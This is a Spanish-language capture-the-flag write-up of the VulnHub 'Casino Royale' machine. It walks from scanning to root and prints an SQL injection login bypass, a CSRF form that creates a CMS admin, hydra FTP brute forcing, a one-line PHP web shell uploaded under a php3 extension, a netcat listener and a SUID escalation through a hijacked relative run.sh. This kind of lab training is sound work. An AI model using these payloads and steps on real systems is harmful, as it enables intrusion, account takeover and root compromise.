---
title: VH - Casino Royale
published: true
categories: [Linux]
tags: [eWPT, eWPTXv2, OSWE, Media]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina `Casino Royale` de dificultad "Media" de la plataforma [VulnHub](https://www.vulnhub.com/entry/casino-royale-1,287/).

Técnicas Vistas: 

- **Web Enumeration**
- **Abusing PokerMax - SQLI (SQL Injection)**
- **Pokermax players management**
- **Virtual Hosting**
- **Snowfox CMS Exploitation - Cross-Site Request Forgery (Add Admin) [CSRF]**
- **Abusing the SMTP service to send a fraudulent email in order to exploit the CSRF**
- **Information Leakage**
- **XXE Attack - XML External Entity Injection (Reading internal files)**
- **FTP Brute Force - Hydra**
- **Uploading malicious PHP file + Bypassing Restiction**
- **Information Leakage - Reading config files**
- **Abusing SUID privilege [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `MyExpenses`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:0b:0e:02, IPv4: 192.168.1.145
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.128	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.141	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.147	00:0c:29:1c:30:6c	VMware, Inc.
192.168.1.130	ac:67:84:98:f6:07	(Unknown)
192.168.1.132	d8:a3:5c:73:eb:02	(Unknown)
192.168.1.138	00:55:da:56:56:66	IEEE Registration Authority

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.942 seconds (131.82 hosts/sec). 8 responded
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.147`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 192.168.1.147
PING 192.168.1.147 (192.168.1.147) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=42.3 ms

--- 192.168.1.147 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.147 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 11:57 CEST
Initiating ARP Ping Scan at 11:57
Scanning 192.168.1.147 [1 port]
Completed ARP Ping Scan at 11:57, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:57
Scanning 192.168.1.147 [65535 ports]
Discovered open port 80/tcp on 192.168.1.147
Discovered open port 21/tcp on 192.168.1.147
Discovered open port 25/tcp on 192.168.1.147
Discovered open port 8081/tcp on 192.168.1.147
Completed SYN Stealth Scan at 11:57, 2.69s elapsed (65535 total ports)
Nmap scan report for 192.168.1.147
Host is up (0.00022s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
80/tcp   open  http
8081/tcp open  blackice-icecap
MAC Address: 00:0C:29:1C:30:6C (VMware)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
❯ nmap -sCV -p21,25,80,8081 192.168.1.147 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 11:57 CEST
Nmap scan report for casino-royale.local (192.168.1.147)
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
25/tcp   open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=casino
| Subject Alternative Name: DNS:casino
| Not valid before: 2018-11-17T20:14:11
|_Not valid after:  2028-11-14T20:14:11
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: casino.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:1C:30:6C (VMware)
```

Antes de pasar al reconocimiento web realizaremos un escaneo con el script de nmap `http-enum`

```bash
❯ nmap --script http-enum -p80,8081 192.168.1.147 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 11:59 CEST
Nmap scan report for casino-royale.local (192.168.1.147)
Host is up (0.00032s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /phpmyadmin/: phpMyAdmin
|   /cards/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|_  /install/: Potentially interesting folder
8081/tcp open  blackice-icecap
MAC Address: 00:0C:29:1C:30:6C (VMware)
```

### Reconocimiento Web

* * *

Accedemos al servicio HTTP por el puerto 80 y observamos la página principal, una imagen y sin aparente funcionalidad 

<img src="/assets/VH/CasinoRoyale/web.png">

Accedemos al servicio HTTP por el puerto 8081 y observamos un botón `Run Data Collect`, pulsamos y vemos que apunta a un recurso `collect.php` pero vemos un error

<img src="/assets/VH/CasinoRoyale/web8081.png">

<img src="/assets/VH/CasinoRoyale/error8081.png">

Listamos el contenido de `robots.txt` en el puerto 80

<img src="/assets/VH/CasinoRoyale/robots.png">

Accedemos a los dos recursos presentados en robots.txt y observamos gifs sin funcionalidad y sin contenido oculto por esteganografía

<img src="/assets/VH/CasinoRoyale/cards.png">

<img src="/assets/VH/CasinoRoyale/kboard.png">

Accedemos al recurso `/install` localizado en el escaneo de nmap con el script **http-enum**

<img src="/assets/VH/CasinoRoyale/install.png">

Observamos que nos encontramos ante un software **PokerMax Pro Poker League Software** en su versión **v0.13**. Procedemos a buscar algún exploit asociado a esta versión

```bash
❯ searchsploit pokermax
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                 |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PokerMax Poker League 0.13 - Insecure Cookie Handling                                                                                                                                          | php/webapps/6766.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
❯ searchsploit -x php/webapps/6766.txt
.
.
.
**************************************************************************************

Instructions :

Find the site running on this script .

Go to http://site.com/pokerleague/pokeradmin/configure.php

It will ask for login. Now in url tab run the exploit command

Then return back to http://site.com/pokerleague/pokeradmin/configure.php

Now u should be loggedin as admin and change the thing into what you want .

**************************************************************************************
.
.
.
```

Examinando el contenido vemos que se puede asignar una cookie como usuario admin. Localizamos una posible ruta en `/pokeradmin`. Accedemos y verificamos que existe y vemos un panel de login

<img src="/assets/VH/CasinoRoyale/pokeradmin.png">

Porbamos inyección `admin' or 1=1-- -` y logramos bypassear el panel de login

<img src="/assets/VH/CasinoRoyale/sqli.png">

<img src="/assets/VH/CasinoRoyale/success.png">

Nos econtramos ante el panel de administración de **PokerMax**

<img src="/assets/VH/CasinoRoyale/dashboard.png">

Enumerando el panel observamos en la lista de jugadores a la usuaria `valenka` que es la única con email registrado

<img src="/assets/VH/CasinoRoyale/players.png">

Clickamos en `Edit Info` y localizamos información sensible en el perfil. Este usuario es el Project manager de varios clientes. Vemos una ruta `/vip-client-portfolios/?uri=blog` y un host que debemos añadir a nuestro `/etc/hosts`

<img src="/assets/VH/CasinoRoyale/info.png">

```bash
❯ cat /etc/hosts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
   8   │ 
   9   │ 192.168.1.147 casino-royale.local
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Accedemos al recurso encontrado y nos econtramos ante un `Snowfox CMS`

<img src="/assets/VH/CasinoRoyale/snow.png">

Examinando el blog observamos un post con información interesante

<img src="/assets/VH/CasinoRoyale/post.png">

Parece que valenka revisa los email de los clientes. Recordemos que tenemos el puerto 25 abierto con el servicio SMTP. Nos conectamos al servicio con telnet y comprobamos que le podamos enviar un email con un enlace a un servidor HTTP que estará alojado en nuestra máquina de atacante, si recibimos la petición confirmaremos que se puede acontecer un ataque **CSRF**

<img src="/assets/VH/CasinoRoyale/testcsrf.png">

Hemos confirmado que valenka revisa el enlace que le pasamos por correo. Buscamos vulenrabilidades asociadas al gestor de contenido `Snowfox` y localizamos una plantilla em HTML para crear un usuario administrador en el gestor de contenido

```bash
❯ searchsploit snowfox
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                 |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Snowfox CMS 1.0 - Cross-Site Request Forgery (Add Admin)                                                                                                                                       | php/webapps/35301.html
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit -x php/webapps/35301.html
.
.
.
<html>
  <body>
    <form action="http://10.0.18.3/snowfox/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="lab@zeroscience.mk" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="USERNAME" />
      <input type="hidden" name="newPassword" value="PASSWORD" />
      <input type="hidden" name="confirmPassword" value="PASSWORD" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```

Modificamos la plantilla de la siguiente forma

```bash
❯ cat test.html
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: test.html
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <html>
   2   │   <body>
   3   │     <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
   4   │       <input type="hidden" name="emailAddress" value="yorch@yorch.com" />
   5   │       <input type="hidden" name="verifiedEmail" value="verified" />
   6   │       <input type="hidden" name="username" value="yorch" />
   7   │       <input type="hidden" name="newPassword" value="yorch123" />
   8   │       <input type="hidden" name="confirmPassword" value="yorch123" />
   9   │       <input type="hidden" name="userGroups[]" value="34" />
  10   │       <input type="hidden" name="userGroups[]" value="33" />
  11   │       <input type="hidden" name="memo" value="CSRFmemo" />
  12   │       <input type="hidden" name="status" value="1" />
  13   │       <input type="hidden" name="formAction" value="submit" />
  14   │       <input type="submit" value="Submit form" />
  15   │     </form>
  16   │   </body>
  17   │ </html>
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Servimos la plantilla con un servidor HTTP con Python y nuevamente enviamos un correo a valenka

<img src="/assets/VH/CasinoRoyale/csrf.png">

Tras recibir la petición confirmamos que nos podemos conectar con el usuario creado al gestor de contenido Snowfox como admin

<img src="/assets/VH/CasinoRoyale/adminfox.png">

Enumeramos panel de administración y observamos dentro de Admin/Users/Manage Accounts una lista de los usuarios. Dentro de la ficha del usuario `le` encontramos información a una nueva ruta

<img src="/assets/VH/CasinoRoyale/users.png">

<img src="/assets/VH/CasinoRoyale/le.png">

Accedemos y observamos el siguiente contenido

<img src="/assets/VH/CasinoRoyale/ultra.png">

Examinamos el código fuente y vemos que a través de una petición POST se puede tramitar una estructura XML

<img src="/assets/VH/CasinoRoyale/source.png">

Recargamos la página y capturamos petición con BurpSuite. Cambiamos el request method a POST e insertamos una estructura XML con los campos descubiertos en el código fuente

<img src="/assets/VH/CasinoRoyale/burp.png">

Tras confirmar que la interpreta correctamente introducimos una cabecera en XML para tratar de acontecer un ataque XXE y poder leer recursos de la máquina víctima

<img src="/assets/VH/CasinoRoyale/xxe.png">

Observamos en el `/etc/passwd` de la máquina el usuario **ftpUserULTRA** cuyo home se aloja en `/var/www/html/ultra-access-view`. Comprobamos que hay capacidad de directory lsiting en este recurso a través de la web

<img src="/assets/VH/CasinoRoyale/directory.png">

Sabiendo el usuario procedemos a realizar un ataque por fierza bruta con hydra sobre el servicio FTP con el usuario `ftpUserULTRA` y el diccionario `rockyou.txt`

```bash
❯ hydra -l ftpUserULTRA -P rockyou.txt ftp://192.168.1.147 -t 15
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-12 13:04:31
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ftp://192.168.1.147:21/
[21][ftp] host: 192.168.1.147   login: ftpUserULTRA   password: bankbank
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-12 13:04:42
```

Nos conectamos por FTP con las credenciales obtenidas y observamos que estamos ante el directorio que tenemos capacidad de directory listing via web

```bash
❯ ftp 192.168.1.147
Connected to 192.168.1.147.
220 Customer Access Level: ULTRA
Name (192.168.1.147:yorch): ftpUserULTRA
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Desktop
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Documents
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Downloads
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Music
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Pictures
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Public
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Templates
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Videos
-rw-r--r--    1 0        0             191 Feb 22  2019 battle2root.html
-rwxr-xr-x    1 0        0              76 Feb 20  2019 hello_world.pl
-rwxr-xr-x    1 1002     1002         1131 Feb 21  2019 main.php
226 Directory send OK.
```

En este punto tratamos de subir un archivo PHP con código malicioso con la intención de obtener RCE en la mñáquina víctima. Si tratamos de subir el archiv con extensión PHP nos bloquea la subida. Para bypassear esta restricción crearemos el archivo con extensión `php3`

```bash
❯ cat cmd.php3
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cmd.php3
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │     system($_GET['cmd']);
   3   │ ?>
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Subimos el archivo y le damos permisos 777

```bash
ftp> put cmd.php3
local: cmd.php3 remote: cmd.php3
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
32 bytes sent in 0.00 secs (504.0323 kB/s)
ftp> chmod 777 cmd.php3
200 SITE CHMOD command ok.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x   14 1002     33           4096 May 12 07:08 .
drwxrwxr-x   14 1002     33           4096 May 12 07:08 ..
-rw-------    1 1002     1002           51 Feb 22  2019 .Xauthority
drwxr-xr-x    3 1002     1002         4096 Feb 22  2019 .cache
drwx------    5 1002     1002         4096 Feb 22  2019 .config
-rw-r--r--    1 1002     1002           55 Feb 22  2019 .dmrc
drwx------    3 1002     1002         4096 Feb 22  2019 .gnupg
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 .wicd
-rw-------    1 1002     1002         2766 Feb 22  2019 .xsession-errors
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Desktop
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Documents
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Downloads
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Music
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Pictures
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Public
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Templates
drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Videos
-rw-r--r--    1 0        0             191 Feb 22  2019 battle2root.html
-rwxrwxrwx    1 1002     1002           32 May 12 07:08 cmd.php3
-rwxr-xr-x    1 0        0              76 Feb 20  2019 hello_world.pl
-rwxr-xr-x    1 1002     1002         1131 Feb 21  2019 main.php
226 Directory send OK.
```
Confirmamos que tenemos acceso al archivo via web y que tenemos capacidad de RCE

<img src="/assets/VH/CasinoRoyale/cmd.png">

<img src="/assets/VH/CasinoRoyale/rce.png">

En este punto nos ponemos en escucha en el puerto 443 con netcat y ejecutamos oneliner para entablarnos una revserse shell

<img src="/assets/VH/CasinoRoyale/shell.png">

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.145] from (UNKNOWN) [192.168.1.147] 38846
bash: cannot set terminal process group (726): Inappropriate ioctl for device
bash: no job control in this shell
www-data@casino:/var/www/html/ultra-access-view$
```

### Movimiento Lateral

* * *

Enumerando archivos de configuración localizamos `config.inc.php`

```bash
www-data@casino:/var/www/html$ find -name \*config\* 2>/dev/null
./ultra-access-view/.config
./vip-client-portfolios/config.inc.php
./vip-client-portfolios/languages/zh-cn/installer/controllers/setconfigurations.ini
./vip-client-portfolios/languages/zh-cn/installer/packages/system/controllers/components/configfileinstructions.ini
./vip-client-portfolios/languages/en-us/installer/controllers/setconfigurations.ini
./vip-client-portfolios/languages/en-us/installer/packages/system/controllers/components/configfileinstructions.ini
./vip-client-portfolios/modules/installer/controllers/setcustomconfigurations.class.php
./vip-client-portfolios/modules/installer/controllers/setconfigurations.class.php
./vip-client-portfolios/modules/installer/packages/system/controllers/components/configfileinstructions.class.php
./vip-client-portfolios/modules/installer/packages/system/views/components/configfileinstructions.view.php
./vip-client-portfolios/modules/core/config.class.php
./vip-client-portfolios/modules/system/libs/ckeditor/config.js
./vip-client-portfolios/modules/system/libs/ckeditor/build-config.js
./includes/config.php
./pokeradmin/configure.php
```

Listamos su contenido y encontramos credenciales de valenka

```bash
www-data@casino:/var/www/html/vip-client-portfolios$ cat config.inc.php 
<?php
self::$cfg['dbDebugMode'] = false;
self::$cfg['dbServer'] = 'localhost';
self::$cfg['dbUser'] = 'valenka';
self::$cfg['dbPass'] = '11archives11!';
self::$cfg['dbName'] = 'vip';
self::$cfg['dbTablePrefix'] = 'sfc_';
self::$cfg['activeTheme'] = 'default';
self::$cfg['defaultLanguage'] = 'en-us';
self::$cfg['cookiePrefix'] = 'sfc_';
self::$cfg['systemSalt'] = '7af76f2c2b0ddba579c42442ca264c45';
self::$cfg['domain'] = 'casino-royale.local';
self::$cfg['webFolder'] = '/vip-client-portfolios/';
```

Logramos migrar al usuario valenka con las credenciales obtenidas

```bash
www-data@casino:/var/www/html/vip-client-portfolios$ su valenka
Password: 
valenka@casino:/var/www/html/vip-client-portfolios$ whoami
valenka
```

### Escalada de Privilegios

* * *

Listando archivos del sistema con privilegios SUID localizamos un binario `mi6_detect_test` dentro de la carpeta `/opt/casino-royale`

```bash
valenka@casino:/$ find \-perm -4000 2>/dev/null
./opt/casino-royale/mi6_detect_test
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/xorg/Xorg.wrap
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/sbin/userhelper
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
./bin/su
./bin/ntfs-3g
./bin/ping
./bin/umount
./bin/mount
./bin/fusermount
valenka@casino:/$ ls -l /opt/casino-royale/
total 40
-rwxrw---- 1 le   www-data  210 Feb 20  2019 casino-data-collection.py
-rw------- 1 le   le         40 Feb 22  2019 closer2root.txt
-rw-r--r-- 1 root root       79 Feb 20  2019 collect.php
-rwxr-xr-x 1 root root      174 Feb 21  2019 index.html
-rwsr-sr-x 1 root root     8696 Feb 20  2019 mi6_detect_test
-rwxrwxr-x 1 le   le         54 Feb 20  2019 php-web-start.sh
-rwxr-x--- 1 le   le        402 Feb 20  2019 run.sh
-rwxrwxr-x 1 le   le         71 Feb 20  2019 user-data.log
```

Con la utilidad strings listamos contenido del binario y observamos que al ejecutarlo llama a un script `run.sh` de forma relativa

```bash
valenka@casino:/opt/casino-royale$ strings mi6_detect_test 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
=W	
AWAVA
AUATL
[]A\A]A^A_
/bin/bash run.sh
.
.
.
```

Vamos a la carpeta `/tmp` y creamos nuestro script `run.sh` el cual asigne privilegios SUID a la bash

```bash
valenka@casino:/tmp$ cat run.sh
chmod u+s /bin/bash
```

Ejecutamos el script y verificamos permisos de la bash

```bash
valenka@casino:/tmp$ /opt/casino-royale/mi6_detect_test 
valenka@casino:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

Con el comando `bash -p` nos lanzamos una bash con privilegios de root

```bash
valenka@casino:/tmp$ bash -p
bash-4.4# whoami
root
```

Accedemos al directorio root para localizar la flag que en este caso está en un archivo HTML. Lanzamos un servidor HTTP con PHP y accedemos via web

```bash
bash-4.4# pwd
/root/flag
bash-4.4# ls -l
total 12
drwxr-xr-x 2 root root 4096 Feb 20  2019 files
-rwx------ 1 root root  354 Feb 20  2019 flag.sh
-rw-r--r-- 1 root root  854 Feb 20  2019 index.php
bash-4.4# php -S 0.0.0.0:8989
PHP 5.6.38-2+0~20181015120829.6+stretch~1.gbp567807 Development Server started at Fri May 12 07:26:10 2023
Listening on http://0.0.0.0:8989
Document root is /root/flag
Press Ctrl-C to quit.
```

<img src="/assets/VH/CasinoRoyale/pwned.png">

Hemos completado la máquina **Casino Royale** de VulnHub!! Happy Hacking!!
